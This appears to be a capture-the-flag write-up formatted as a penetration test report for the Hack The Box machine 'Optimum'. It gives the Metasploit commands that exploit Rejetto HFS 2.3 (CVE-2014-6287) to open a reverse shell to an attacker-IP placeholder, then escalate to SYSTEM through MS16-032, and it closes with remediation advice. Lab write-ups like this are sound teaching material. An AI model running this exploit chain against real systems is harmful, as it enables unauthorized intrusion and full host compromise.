# Penetration Test Report — Optimum

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Windows-blue) ![Status](https://img.shields.io/badge/scope-authorized%20lab-lightgrey)

## Executive Summary

An authorized penetration test was conducted against the host `target.htb`. The assessment identified an unauthenticated remote code execution vulnerability in **Rejetto HTTP File Server 2.3** (CVE-2014-6287), which provided an initial foothold. A missing security patch (MS16-032) was then leveraged to escalate privileges to `NT AUTHORITY\SYSTEM`, resulting in full compromise of the host.

## Scope

| Item | Detail |
|---|---|
| Target | `target.htb` |
| Environment | Windows Server 2012 R2 (x64) |
| Assessment type | External black-box |

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Rejetto HFS 2.3 — Remote Code Execution (CVE-2014-6287) | Critical |
| 2 | Missing patch MS16-032 — Secondary Logon Handle privilege escalation | High |

## Technical Walkthrough

### 1. Enumeration

Port scanning with Nmap revealed a single exposed service:

```bash
nmap -sC -sV target.htb
```

**Result:** port `80/tcp` — Rejetto **HttpFileServer 2.3**. Public research maps this version to **CVE-2014-6287**, a remote command execution vulnerability with a public PoC ([EDB-39161](https://www.exploit-db.com/exploits/39161/)) and a Metasploit module.

### 2. Exploitation — Initial Foothold

The vulnerability was exploited with the Metasploit module `exploit/windows/http/rejetto_hfs_exec`:

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS target.htb
set LHOST <attacker-ip>
run
```

A Meterpreter session was obtained, and the user flag was recovered:

```
C:\Documents and Settings\kostas\Desktop\user.txt.txt
```

### 3. Privilege Escalation

`sysinfo` confirmed a Windows 2012 R2 x64 host. The default x86 reverse shell was migrated into the x64 `explorer.exe` process:

```
meterpreter > ps
meterpreter > migrate <PID_of_explorer.exe>
```

Reviewing local exploit candidates (`search exploit/windows/local`), **MS16-032** (`ms16_032_secondary_logon_handle_privesc`) matched the unpatched build and yielded a SYSTEM shell:

```
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION <id>
run
```

Root flag: `C:\Users\Administrator\Desktop\root.txt`.

## Remediation

- **Upgrade or remove Rejetto HFS 2.3**; it should not be internet- or network-exposed.
- **Apply MS16-032** and establish routine patch management for Windows hosts.
- Restrict outbound connections from server workloads to limit reverse-shell capability.

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1190 — Exploit Public-Facing Application |
| Privilege Escalation | T1068 — Exploitation for Privilege Escalation |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
